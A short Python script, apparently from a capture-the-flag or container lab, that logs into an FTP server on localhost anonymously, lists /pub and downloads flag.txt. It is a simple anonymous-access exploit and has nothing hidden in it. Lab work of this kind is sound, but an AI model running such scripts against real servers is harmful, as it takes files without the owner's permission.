import ftplib
import sys

TARGET = "localhost"
PORT = 21

def exploit_ftp():
    print(f"[*] Testing FTP Anonymous Access on {TARGET}:{PORT}...")
    try:
        ftp = ftplib.FTP()
        ftp.connect(TARGET, PORT, timeout=10)
        ftp.login('anonymous', '')
        print("[+] Success! Logged in as anonymous.")
        
        print("[*] List of files in /pub:")
        files = []
        ftp.retrlines('LIST /pub', files.append)
        for f in files:
            print(f"    {f}")
            
        if any("flag.txt" in f for f in files):
            print("[+] Found flag.txt! Downloading content...")
            ftp.retrbinary('RETR /pub/flag.txt', lambda data: sys.stdout.write(data.decode()))
            print("\n")
            
        ftp.quit()
    except Exception as e:
        print(f"[-] FTP access failed: {e}")
        print("[!] Note: On some ARM64 (M1/M2) Macs, 'ftplib' may struggle with emulated amd64 containers. Try using a standard FTP client if this fails.")

if __name__ == "__main__":
    exploit_ftp()
